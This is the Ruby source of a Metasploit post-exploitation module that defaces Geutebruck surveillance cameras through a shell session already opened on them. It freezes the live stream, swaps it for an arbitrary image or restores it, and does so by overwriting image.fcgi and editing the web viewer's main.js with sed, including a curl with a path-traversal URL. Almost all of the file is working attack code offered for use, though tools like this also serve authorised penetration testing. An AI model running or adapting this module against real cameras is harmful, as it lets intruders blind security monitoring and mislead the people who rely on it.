##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize
    super(
      'Name' => 'Geutebruck Camera Deface',
      'Description' => %q{
        This module will be applied on a session connected to a Geutebruck Camera shell. It will freeze the camera display/deface
        the display of the camera on the web panel with an image.
      },
      'Author' => 'Ibrahim Ayadhi, Sébastien Charbonnier - RandoriSec',
      'License' => MSF_LICENSE,
      'Platform' => ['linux'],
      'SessionTypes' => ['shell'],
      'Actions' => [
        ['FREEZE_CAMERA', { 'Description' => 'It freezes the last image from the video stream' }],
        ['CHANGE_IMAGE', { 'Description' => 'It replaces the video stream by an arbitrary image' }],
        ['RESUME_STREAM', { 'Description' => 'It resumes the video stream back to a normal state' }]
      ],
      'DefaultAction' => 'FREEZE_CAMERA'
    )

    register_options(
      [
        OptString.new('IMAGE', [false, 'Local image path to upload']),
      ]
    )
  end

  def run
    print_status('-- Starting action --')
    send("action_#{action.name.downcase}")
  end

  def action_freeze_camera
    backup_image_fcgi
    print_status('Taking a snapshot...')
    cmd_exec('curl http://localhost/test/../uapi-cgi/snapshot.fcgi -o /usr/www/uapi-cgi/viewer/image.fcgi')
    print_status('Freezing the stream...')
    pwn_main_js
    print_status('Stream frozen!')
  end

  def action_change_image
    fail_with(Failure::BadConfig, 'The IMAGE option is required by the CHANGE_IMAGE action.') if datastore['IMAGE'].blank?
    backup_image_fcgi
    print_status('Uploading a custom image...')
    upload_file('/usr/www/uapi-cgi/viewer/image.fcgi', datastore['image'])
    pwn_main_js
    print_status('Done! The stream should be replaced by your image!')
  end

  def action_resume_stream
    print_status('Restoring image.fcgi...')
    cmd_exec('mv /usr/www/uapi-cgi/viewer/image.fcgi.bak /usr/www/uapi-cgi/viewer/image.fcgi')
    print_status('Restoring main.js backup...')
    cmd_exec('mv /usr/www/viewer/js/main.js.bak /usr/www/viewer/js/main.js')
    print_status('Restored! Stream back to a normal state.')
  end

  def pwn_main_js
    print_status('Backing up the original main.js...')
    cmd_exec('cp /usr/www/viewer/js/main.js /usr/www/viewer/js/main2.js')
    cmd_exec('mv /usr/www/viewer/js/main.js /usr/www/viewer/js/main.js.bak')
    print_status('Using the new main.js...')
    cmd_exec("sed '/ImageBuf.src = snapshot_url;/ i snapshot_url=\"/uapi-cgi/viewer/image.fcgi\"' -i /usr/www/viewer/js/main2.js")
    cmd_exec('mv /usr/www/viewer/js/main2.js /usr/www/viewer/js/main.js')
  end

  def backup_image_fcgi
    print_status('Backing up image.fcgi...')
    cmd_exec('cp /usr/www/uapi-cgi/viewer/image.fcgi /usr/www/uapi-cgi/viewer/image.fcgi.bak')
  end
end
